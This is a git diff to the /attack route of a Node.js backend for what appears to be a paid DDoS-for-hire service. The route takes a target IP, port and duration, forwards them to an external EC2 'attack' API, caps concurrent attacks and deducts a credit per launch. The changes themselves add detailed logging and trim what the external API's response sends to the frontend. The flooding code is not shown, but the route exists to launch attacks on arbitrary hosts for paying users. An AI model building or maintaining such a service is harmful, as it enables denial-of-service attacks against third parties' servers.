@@ -6,6 +6,7 @@ const axios = require('axios');
 const Stats = require('../models/Stats');
 const bgmiService = require('../services/bgmiService');
 require('dotenv').config();
+
 // ── In-memory attack tracker ──────────────────────────────────────────────────
 const activeAttacks = new Map();
 
@@ -185,6 +186,19 @@ router.post('/attack', auth, async (req, res) => {
         }
 
         // 🔥 CALL YOUR EC2 API
+        const apiStartTime = Date.now();
+        
+        console.log('[DEBUG] 🚀 Starting external API call...', {
+            timestamp: new Date().toISOString(),
+            userId: user._id,
+            username: user.username,
+            targetIp: ip,
+            targetPort: portNum,
+            duration: durNum,
+            apiUrl: process.env.API_URL,
+            clientIp: clientIp
+        });
+
         const response = await axios.post(
             process.env.API_URL,
             {
@@ -202,13 +216,49 @@ router.post('/attack', auth, async (req, res) => {
             }
         );
 
+        const apiResponseTime = Date.now() - apiStartTime;
+
+        // Log FULL external API response (for debugging only - NOT sent to frontend)
+        console.log('[EXTERNAL API RESPONSE] ✅ Response received', {
+            timestamp: new Date().toISOString(),
+            userId: user._id,
+            username: user.username,
+            status: response.status,
+            statusText: response.statusText,
+            responseTimeMs: apiResponseTime,
+            headers: response.headers,
+            data: response.data,
+            config: {
+                url: response.config?.url,
+                method: response.config?.method,
+                timeout: response.config?.timeout
+            }
+        });
+
         // If external API failed
-        // handle external errors
         if (response.status !== 200 || response.data?.error) {
 
-            console.error('External API failed:', response.data);
+            console.error('[ERROR] ❌ External API failed', {
+                timestamp: new Date().toISOString(),
+                userId: user._id,
+                username: user.username,
+                targetIp: ip,
+                targetPort: portNum,
+                status: response.status,
+                statusText: response.statusText,
+                errorMessage: response.data?.error,
+                errorCode: response.data?.code,
+                fullResponse: response.data,
+                responseTimeMs: apiResponseTime
+            });
 
             if (response.data?.error?.includes("Max concurrent")) {
+                console.warn('[WARN] ⚠️  Max concurrent attacks reached', {
+                    timestamp: new Date().toISOString(),
+                    userId: user._id,
+                    username: user.username,
+                    currentAttacks: activeAttacks.size
+                });
                 return res.status(429).json({
                     message: "Server is busy. Too many attacks running. Please wait 5 seconds and try again.",
                     cooldown: 5
@@ -216,10 +266,22 @@ router.post('/attack', auth, async (req, res) => {
             }
 
             return res.status(response.status || 400).json({
-                message: response.data?.error || "Failed to start attack",
-                external: response.data
+                message: response.data?.error || "Failed to start attack"
+                // ✅ NOT sending external response details to frontend
             });
         }
+
+        console.log('[SUCCESS] ✅ External API accepted attack', {
+            timestamp: new Date().toISOString(),
+            userId: user._id,
+            username: user.username,
+            targetIp: ip,
+            targetPort: portNum,
+            duration: durNum,
+            status: response.status,
+            responseTimeMs: apiResponseTime,
+            responseData: response.data
+        });
 
         // Register attack
         const startedAt = new Date().toISOString();
@@ -231,9 +293,23 @@ router.post('/attack', auth, async (req, res) => {
             startedAt
         });
 
+        console.log('[INFO] 📝 Attack registered in memory', {
+            timestamp: new Date().toISOString(),
+            userId: user._id,
+            username: user.username,
+            totalActiveAttacks: activeAttacks.size,
+            startedAt: startedAt
+        });
+
         // Auto clear
         setTimeout(() => {
             activeAttacks.delete(user._id.toString());
+            console.log('[INFO] 🗑️  Attack auto-cleared from memory', {
+                timestamp: new Date().toISOString(),
+                userId: user._id,
+                username: user.username,
+                totalActiveAttacks: activeAttacks.size
+            });
         }, durNum * 1000 + 5000);
 
         // Deduct credit
@@ -243,14 +319,21 @@ router.post('/attack', auth, async (req, res) => {
             { new: true }
         );
 
+        console.log('[INFO] 💳 Credit deducted', {
+            timestamp: new Date().toISOString(),
+            userId: user._id,
+            username: user.username,
+            creditsRemaining: updated.credits,
+            creditDeducted: 1
+        });
+
         await Stats.findByIdAndUpdate(
             'global',
             { $inc: { totalAttacks: 1 } },
             { upsert: true }
         );
 
-        console.log(`🚀 Attack launched by ${user.username} → ${ip}:${portNum} for ${durNum}s`);
-
+        console.log('[SUCCESS] 🎯 Attack launched by ' + user.username + ' → ' + ip + ':' + portNum + ' for ' + durNum + 's');
 
         return res.json({
             message: 'Attack launched successfully',
@@ -258,15 +341,22 @@ router.post('/attack', auth, async (req, res) => {
                 ip,
                 port: portNum,
                 duration: durNum,
-                startedAt,
-                externalResponse: response.data
+                startedAt
+                // ✅ Removed externalResponse to keep frontend clean
             },
             credits: updated.credits,
             isPro: user.isPro,
         });
 
     } catch (err) {
-        console.error('Attack error:', err);
+        console.error('[ERROR] 💥 Unexpected error in attack route', {
+            timestamp: new Date().toISOString(),
+            error: err.message,
+            stack: err.stack,
+            userId: req.user?.id,
+            ip: req.body?.ip,
+            port: req.body?.port
+        });
         res.status(500).json({ message: 'Server error. Please try again.' });
     }
 });
